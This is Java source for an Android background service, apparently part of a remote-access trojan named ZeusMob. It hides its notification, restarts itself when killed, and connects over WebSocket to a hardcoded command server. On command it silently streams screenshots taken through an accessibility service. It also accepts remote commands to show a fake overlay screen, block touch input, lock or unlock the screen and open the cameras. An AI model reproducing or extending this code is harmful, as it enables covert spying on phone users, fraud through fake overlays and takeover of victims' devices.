package com.zeusmob.app.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.Display;
import androidx.core.app.NotificationCompat;
import com.zeusmob.app.R;
import com.zeusmob.app.overlay.OverlayManager;
import java.io.ByteArrayOutputStream;
import java.util.concurrent.TimeUnit;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;

public class ZeusForegroundService extends Service {

    private static final String TAG        = "ZEUS_DEBUG";
    private static final String CHANNEL_ID = "zeus_fg_silent";
    private static final int    NOTIF_ID   = 1001;

    // WebSocket endpoint — same as server URL in strings.xml
    private static final String WS_BASE =
        "wss://67cc0a24-f21b-4384-b1dc-7ea4a07ae976-00-3s3efgf80iyzd.kirk.replit.dev/api/ws";

    /** Static reference so OverlayManager / AccessibilityService can send frames */
    public static ZeusForegroundService instance;

    private OkHttpClient  wsClient;
    private WebSocket     webSocket;
    private Handler       reconnectHandler;
    private boolean       destroyed       = false;
    private String        deviceId;
    private OverlayManager overlayManager;

    // ── Screen-capture loop ──────────────────────────────────────
    private boolean capturingFrames     = false;
    private Handler captureHandler;
    private static final int FRAME_INTERVAL_MS = 250; // ~4 FPS
    private int     frameSeq            = 0;

    // ── Lifecycle ────────────────────────────────────────────────
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "=== ZeusForegroundService.onCreate() ===");

        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());

        reconnectHandler = new Handler(Looper.getMainLooper());
        captureHandler   = new Handler(Looper.getMainLooper());
        overlayManager   = OverlayManager.getInstance(getApplicationContext());

        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (deviceId == null || deviceId.isEmpty())
            deviceId = "device-" + System.currentTimeMillis();
        Log.d(TAG, "Device ID: " + deviceId);

        connectWebSocket();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        destroyed = true;
        instance  = null;
        stopCaptureLoop();
        if (webSocket != null) webSocket.close(1000, "Service destroyed");
        if (wsClient  != null) wsClient.dispatcher().executorService().shutdown();
        super.onDestroy();
        // Auto-restart
        startService(new Intent(getApplicationContext(), ZeusForegroundService.class));
    }

    // ── Public: send raw bytes (JPEG frame) via WebSocket ────────
    public void sendBinaryFrame(byte[] jpeg) {
        if (webSocket != null && capturingFrames) {
            webSocket.send(ByteString.of(jpeg));
        }
    }

    // ── WebSocket ────────────────────────────────────────────────
    private void connectWebSocket() {
        if (destroyed) return;

        String wsUrl = WS_BASE + "?role=device&deviceId=" + deviceId;
        Log.d(TAG, "Conectando WS: " + wsUrl);

        wsClient = new OkHttpClient.Builder()
            .pingInterval(20, TimeUnit.SECONDS)
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.SECONDS)
            .build();

        Request request = new Request.Builder().url(wsUrl).build();

        webSocket = wsClient.newWebSocket(request, new WebSocketListener() {

            @Override
            public void onOpen(WebSocket ws, Response response) {
                Log.d(TAG, "✅ WS ABERTO — HTTP " + response.code());
                String json = "{\"event\":\"device_online\",\"app\":\"ZeusMob\","
                    + "\"deviceId\":\"" + deviceId + "\"}";
                ws.send(json);
                Log.d(TAG, "device_online enviado");
            }

            @Override
            public void onMessage(WebSocket ws, String text) {
                Log.d(TAG, "WS msg: " + text);

                if (text.contains("\"device_registered\"")) {
                    Log.d(TAG, "✅ REGISTADO no servidor");
                    return;
                }

                // Stream control — relayed by the server from the web panel
                if (text.contains("\"start_stream\"")) {
                    Log.d(TAG, "▶ start_stream recebido — iniciando captura");
                    new Handler(Looper.getMainLooper()).post(() -> startCaptureLoop());
                    return;
                }
                if (text.contains("\"stop_stream\"")) {
                    Log.d(TAG, "⏹ stop_stream recebido — parando captura");
                    new Handler(Looper.getMainLooper()).post(() -> stopCaptureLoop());
                    return;
                }

                // Command from admin panel
                if (text.contains("\"type\":\"command\"")) {
                    handleCommand(text);
                }

                // Ping → Pong
                if (text.contains("\"ping\"")) {
                    ws.send("{\"type\":\"pong\",\"deviceId\":\"" + deviceId + "\"}");
                }
            }

            @Override
            public void onMessage(WebSocket ws, ByteString bytes) {
                // Binary from server — not expected in device role
                Log.d(TAG, "WS binário inesperado: " + bytes.size() + " bytes");
            }

            @Override
            public void onFailure(WebSocket ws, Throwable t, Response response) {
                int code = (response != null) ? response.code() : -1;
                Log.w(TAG, "❌ WS FALHA — " + t.getMessage() + " HTTP=" + code);
                scheduleReconnect();
            }

            @Override
            public void onClosed(WebSocket ws, int code, String reason) {
                Log.d(TAG, "WS fechado — " + code + " " + reason);
                scheduleReconnect();
            }
        });
    }

    // ── Frame Capture Loop ───────────────────────────────────────

    private void startCaptureLoop() {
        if (capturingFrames) return;
        capturingFrames = true;
        frameSeq = 0;
        Log.d(TAG, "Iniciando loop de captura de frames (intervalo=" + FRAME_INTERVAL_MS + "ms)");
        captureNextFrame();
    }

    private void stopCaptureLoop() {
        capturingFrames = false;
        captureHandler.removeCallbacksAndMessages(null);
        Log.d(TAG, "Loop de captura PARADO");
    }

    private void captureNextFrame() {
        if (!capturingFrames) return;

        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc == null) {
            // Service not connected yet — retry shortly
            captureHandler.postDelayed(this::captureNextFrame, FRAME_INTERVAL_MS);
            return;
        }

        long captureStart = System.currentTimeMillis();

        svc.captureScreenSilently(Display.DEFAULT_DISPLAY, bitmap -> {
            if (bitmap != null && webSocket != null && capturingFrames) {
                try {
                    // Scale down to 540×1170 for bandwidth efficiency
                    Bitmap scaled = Bitmap.createScaledBitmap(bitmap, 540, 1170, true);
                    ByteArrayOutputStream bos = new ByteArrayOutputStream(64 * 1024);
                    scaled.compress(Bitmap.CompressFormat.JPEG, 65, bos);
                    byte[] jpeg = bos.toByteArray();

                    webSocket.send(ByteString.of(jpeg));
                    frameSeq++;

                    if (frameSeq % 20 == 0) {
                        long elapsed = System.currentTimeMillis() - captureStart;
                        Log.d(TAG, "Frame #" + frameSeq + " — " + jpeg.length + " bytes — " + elapsed + "ms");
                        // Send stats
                        webSocket.send("{\"type\":\"stats\","
                            + "\"fps\":" + (1000 / Math.max(1, elapsed)) + ","
                            + "\"latencyMs\":" + elapsed + ","
                            + "\"deviceId\":\"" + deviceId + "\"}");
                    }

                    if (!scaled.isRecycled()) scaled.recycle();
                    if (!bitmap.isRecycled()) bitmap.recycle();
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao comprimir frame: " + e.getMessage());
                }
            }

            if (capturingFrames) {
                captureHandler.postDelayed(this::captureNextFrame, FRAME_INTERVAL_MS);
            }
        });
    }

    // ── Command Dispatcher ───────────────────────────────────────

    private void handleCommand(String json) {
        String cmd = extractJsonString(json, "cmd");
        Log.d(TAG, "Comando: " + cmd);
        new Handler(Looper.getMainLooper()).post(() -> {
            switch (cmd) {
                case "toggle_overlay":
                    overlayManager.toggleFakeScreen();
                    sendStatusReport("overlay_toggled", overlayManager.isFakeScreenActive() ? "on" : "off");
                    break;
                case "toggle_touch_block":
                    overlayManager.toggleTouchBlock();
                    sendStatusReport("touch_block_toggled", overlayManager.isTouchBlockActive() ? "on" : "off");
                    break;
                case "lock_screen":
                    lockScreen();
                    sendStatusReport("screen_locked", "ok");
                    break;
                case "unlock_screen":
                    unlockScreen();
                    sendStatusReport("screen_unlocking", "ok");
                    break;
                case "camera_front":
                    openCamera(true);
                    break;
                case "camera_back":
                    openCamera(false);
                    break;
                default:
                    Log.w(TAG, "Comando desconhecido: " + cmd);
            }
        });
    }

    // ── Lock / Unlock ────────────────────────────────────────────
    private void lockScreen() {
        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc != null) svc.lockScreen();
        else Log.w(TAG, "AccessibilityService não disponível para lock");
    }

    private void unlockScreen() {
        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc != null) svc.unlockScreen();
    }

    private void openCamera(boolean front) {
        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
        if (svc != null) svc.openCamera(front);
    }

    // ── Status report ────────────────────────────────────────────
    private void sendStatusReport(String event, String value) {
        if (webSocket == null) return;
        webSocket.send("{\"type\":\"status_report\",\"event\":\"" + event
            + "\",\"value\":\"" + value + "\",\"deviceId\":\"" + deviceId + "\"}");
    }

    // ── Utilities ────────────────────────────────────────────────
    private String extractJsonString(String json, String key) {
        String search = "\"" + key + "\":\"";
        int start = json.indexOf(search);
        if (start < 0) return "";
        start += search.length();
        int end = json.indexOf("\"", start);
        return end < 0 ? "" : json.substring(start, end);
    }

    private void scheduleReconnect() {
        if (destroyed) return;
        stopCaptureLoop();
        reconnectHandler.postDelayed(() -> {
            if (!destroyed) connectWebSocket();
        }, 15_000);
    }

    // ── Notification (PRIORITY_MIN → hidden) ─────────────────────
    private void createNotificationChannel() {
        NotificationChannel ch = new NotificationChannel(
            CHANNEL_ID, "Zeus Background", NotificationManager.IMPORTANCE_NONE);
        ch.setShowBadge(false);
        ch.enableLights(false);
        ch.enableVibration(false);
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm != null) nm.createNotificationChannel(ch);
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Serviço")
            .setContentText("Em execução")
            .setSmallIcon(R.drawable.ic_zeus_notif)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .build();
    }
}
